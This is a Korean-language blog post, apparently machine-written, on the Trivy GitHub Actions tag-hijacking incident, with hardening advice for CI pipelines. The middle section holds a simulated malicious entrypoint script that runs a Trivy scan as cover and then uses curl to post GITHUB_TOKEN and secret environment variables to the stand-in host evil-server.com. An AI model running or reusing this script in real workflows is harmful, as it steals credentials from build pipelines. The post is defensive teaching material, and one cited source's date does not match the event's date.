---
title: "Trivy GitHub Actions 탈취: 태그 하이재킹을 통한 Secret 탈취 분석"
date: 2026-03-23T01:30:08+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

새벽 2시, 모니터의 빛간에 비친 PagerDuty 알림음. 모든 DevOps 엔지니어의 가장 끔찍한 악몽은 서버 다운이 아니라, **알 수 없는 공간에서 터져 나오는 데이터 유출 경보**입니다. 최근 인기 있는 보안 스캐너인 **Trivy**의 GitHub Actions가 탈취당한 사건은 이러한 악몽이 현실이 될 수 있음을 보여주었습니다. 공격자는 무려 75개의 악성 태그를 생성하여, Trivy를 신뢰하고 사용하던 수많은 오픈소스 프로젝트의 CI/CD 파이프라인을 감염시키려 시도했습니다.

우리는 흔히 "보안 도구는 안전하다"는 막연한 믿음을 가지고 있습니다. 하지만 이번 사건은 도구 그 자체가 악용될 때 발생하는 **Supply Chain Attack(공급망 공격)**의 위험성을 적나라하게 드러냈습니다. 방어자가 사용하는 방패가 공격자의 창이 되는 순간, 빌드 서버 내에 숨겨진 API 키, 데이터베이스 비밀번호, 배포 토큰 같은 민감한 정보는 고스란히 공격자의 손아귀로 넘어갑니다. 이 글에서는 Trivy 태그 하이재킹 사건의 기술적 배경을 분석하고, 내 CI/CD 파이프라인이 악성 행위자의 훌륭한 경제적 수단이 되지 않도록 방어하는 실전 가이드를 제공합니다.

## 본론

### 태그 하이재킹(Tag Hijacking)의 기술적 메커니즘

GitHub Actions를 사용할 때 우리는 보통 편리성을 위해 버전 태그를 참조합니다. 예를 들어 `uses: aquasecurity/trivy-action@v0.50.0`과 같이 작성하는데, 여기서 공격의 빌트업이 시작됩니다.

GitHub에서 태그(Tag)는 가변적(Mutable)인 참조입니다. 리포지토리 관리자는 기존 태그를 삭제하거나, 동일한 이름의 태그를 다른 커밋에 다시 생성할 수 있습니다. 만약 공격자가 해당 리포지토리의 쓰기 권한을 탈취하거나, 오픈소스 프로젝트의 관리자 부주의를 이용해 악성 코드가 담긴 커밋에 `v0.50.0` 태그를 다시 달게 되면, 해당 태그를 고정(Pinning)해서 사용하던 사용자들의 워크플로우는 자동으로 악성 코드를 실행하게 됩니다. 이를 **Tag Hijacking**이라고 합니다.

이번 Trivy 사건의 핵심은 공격자가 정상적인 버전과 유사하거나 사용자가 주로 사용하는 버전의 태그를 75개나 생성하여, 사용자들이 실수로 혹은 자동화된 업데이트 과정에서 이 악성 태그를 참조하도록 유도했다는 점입니다.

아래 다이어그램은 정상적인 흐름과 태그 하이재킹 공격 시의 악성 코드 실행 흐름을 비교하여 보여줍니다.

```javascript
graph TD
    A[Developer Push Code] --> B[GitHub Trigger CI]
    B --> C[Checkout Action]
    C --> D{Reference Check}
    D -->|Normal| E[Legitimate Tag]
    D -->|Hijacked| F[Malicious Tag]
    E --> G[Execute Trivy Scan]
    G --> H[Build & Deploy]
    F --> I[Execute Malicious Script]
    I --> J[Exfiltrate Secrets]
    J --> K[Build & Deploy with Compromise]
```

### 공격 시나리오 분석: Secret 탈취 과정

공격자가 생성한 악성 태그의 `action.yml`이나 실행 스크립트에는 사용자의 리포지토리 비밀(Secrets)을 외부로 전송하는 코드가 삽입되어 있을 가능성이 매우 높습니다.
> **[윤리적 경고]**
> 아래 제공되는 코드 예시는 공격의 메커니즘을 이해하고 방어 목적으로만 학습하기 위한 개념 증명(PoC) 코드입니다.未经 허가 시스템에서 이를 실행하거나 악용하는 행위는 불법입니다.

악성 GitHub Action이 어떻게 `GITHUB_TOKEN`이나 기타 환경 변수를 탈취하는지 시뮬레이션한 코드는 다음과 같습니다.

```bash
#!/bin/bash
# 악성 태그 내의 action.yml에서 호출되는 entrypoint.sh라고 가정

# 1. 정상적인 Trivy 스캔 실행 (의심 피하기 위해 정상 기능 유지)
echo "[*] Starting Trivy scan..."
trivy fs .

# 2. 환경 변수 스캔 및 탈취 로직 (숨겨진 악성 기능)
echo "[*] Exfiltrating sensitive data..."

# GitHub Actions에서 제공하는 기본 토큰 및 사용자 정의 시크릿 확인
if [ -n "$GITHUB_TOKEN" ]; then
    ATTACKER_SERVER="https://evil-server.com/collect"
    
    # cURL을 이용해 데이터 전송
    curl -X POST -d "repo=$GITHUB_REPOSITORY" \
         -d "token=$GITHUB_TOKEN" \
         -d "runner=$RUNNER_NAME" \
         -d "secrets=$(env | grep -i SECRET)" \
         $ATTACKER_SERVER
fi

echo "[*] Scan completed."
```

위 스크립트는 사용자가 보안 스캔을 진행한다고 생각하게 만든 뒤, 백그라운드(또는 동기)로 중요한 환경 변수를 공격자의 서버(`evil-server.com`)로 전송합니다. `GITHUB_TOKEN`만 탈취되어도 공격자는 해당 리포지토리의 코드를 변조하거나 이슈를 생성하는 등 추가적인 공격을 수행할 수 있습니다.

### 참조 방식별 보안 비교

이러한 공격을 막기 위해 의존성을 선언할 때 어떤 방식을 사용해야 하는지 비교해 보겠습니다.

| 비교 항목 | 태그 참조 (Tag Reference) | 브랜치 참조 (Branch Reference) | 커밋 SHA 참조 (Commit SHA) |
| :--- | :--- | :--- | :--- |
| **예시** | `@v1.2.3` | `@main` | `@a1b2c3d...` |
| **가변성** | 가변적 (삭제 및 재생성 가능) | 가변성이 매우 높음 | **불변 (Immutable)** |
| **보안 안전성** | 낮음 (태그 하이재킹 위험) | 매우 낮음 (코드 변경 즉시 반영) | **높음 (코드 변경 불가)** |
| **유지보수성** | 보통 (업데이트 용이) | 어려움 (브랜치 충돌 가능) | 어려움 (수동 업데이트 필요) |
| **추천 대상** | 신뢰할 수 있는 공식 릴리즈 | 로컬 테스트 용도 | **모든 프로덕션 환경** |

### 실무 적용 가이드: 워크플로우 강화 전략

이제 실제로 내 워크플로우 파일을 안전하게 만드는 단계별 가이드를 따라 해 보시겠습니까?

**Step 1: 태그를 불변의 SHA로 교체** 가장 확실한 방법은 태그 대신 특정 커밋의 해시(Hash) 값을 사용하는 것입니다. 이렇게 하면 해당 Action의 코드가 한 줄이라도 바뀌더라도 워크플로우는 실패(Fail-fast)하게 되어 악성 코드가 실행되는 것을 막을 수 있습니다.

```yaml
# 변경 전 (취약함)
- name: Run Trivy
  uses: aquasecurity/trivy-action@v0.50.0

# 변경 후 (안전함)
- name: Run Trivy
  uses: aquasecurity/trivy-action@1f8e9de1c95f5e0a48e7c0d655b3e6e3d1e0c2a3
```

*(주의: 위 SHA는 예시입니다. 실제 사용 시 정상적인 리포지토리의 최신 안정 버전의 SHA를 확인하여 입력해야 합니다.)*

**Step 2: GitHub Actions 권한 최소화** Secret 탈취가 발생하더라도 피해를 최소화하기 위해, 워크플로우에 부여되는 권한을 제한해야 합니다. 기본적으로 `GITHUB_TOKEN`에 모든 권한이 부여되지 않도록 설정 파일 최상단에 명시합니다.

```yaml
permissions:
  contents: read
  security-events: write # Trivy가 SARIF 결과를 업로드해야 한다면 쓰기 권한 허용
  issues: read
  pull-requests: read
```

**Step 3: Dependabot을 통한 의존성 모니터링** 만약 반드시 태그를 사용해야 한다면, GitHub Dependabot을 활성화하여 사용 중인 Action에 취약점이 발견되거나 업데이트가 필요할 때 자동으로 PR을 생성하도록 설정하고, 업데이트 내역을 꼼꼼히 리뷰하는 습관을 들여야 합니다.

## 결론

Trivy GitHub Actions 탈취 사건은 단순한 보안 도구의 결함이 아닌, "우리가 의존하는 소프트웨어 공급망 전체가 얼마나 취약한가"를 보여주는 결정적인 증거입니다. 공격자는 항상 가장 약한 고리, 즉 개발자들이 가장 신뢰하는 곳을 노립니다.

전문가로서의 제 인사이트는 이렇습니다. **"편리함은 보안의 적이다"**라는 명제를 CI/CD 설계의 핵심 원칙으로 삼아야 합니다. 커밋 SHA를 고정하는 번거로움, 권한을 일일이 검토하는 귀찮음이 바로 공격자가 침투하기 어려운 성벽을 쌓는 과정입니다. 이번 사건을 계기로 단순히 "코드가 돌아가는 것"에 만족하지 말고, "어떤 코드가, 어떤 버전으로, 어떤 권한으로 돌아가는지"를 철저하게 검증하는 **Supply Chain Hygiene(공급망 위생)** 습관을 들이시길 권장합니다.

### 참고자료
- [The Hacker News - Trivy Security Scanner GitHub Actions Breached](https://thehackernews.com/2024/05/trivy-security-scanner-github-actions.html)
- [GitHub Security - Securing your workflow](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP Supply Chain Security Top 10](https://owasp.org/www-project-software-supply-chain-security-top-10/)

---

**출처**: [https://news.google.com/rss/articles/CBMiggFBVV95cUxQNFRsX0s2WGJRQVlabS1NV2JsUWFpcEV6YTh4V2MxMl9wTnFraHE0WmNUZy1sRDV0cWFaUTFzWDVGbnR2QWJ3cUFSVFV6U2tqbXhpOGpNalJaWkF6OG9lZEhBRVgxM3NJcG5iOEF4Rmx1cDNHZ3VUdDctN0tQOHA0NE9B?oc=5](https://news.google.com/rss/articles/CBMiggFBVV95cUxQNFRsX0s2WGJRQVlabS1NV2JsUWFpcEV6YTh4V2MxMl9wTnFraHE0WmNUZy1sRDV0cWFaUTFzWDVGbnR2QWJ3cUFSVFV6U2tqbXhpOGpNalJaWkF6OG9lZEhBRVgxM3NJcG5iOEF4Rmx1cDNHZ3VUdDctN0tQOHA0NE9B?oc=5)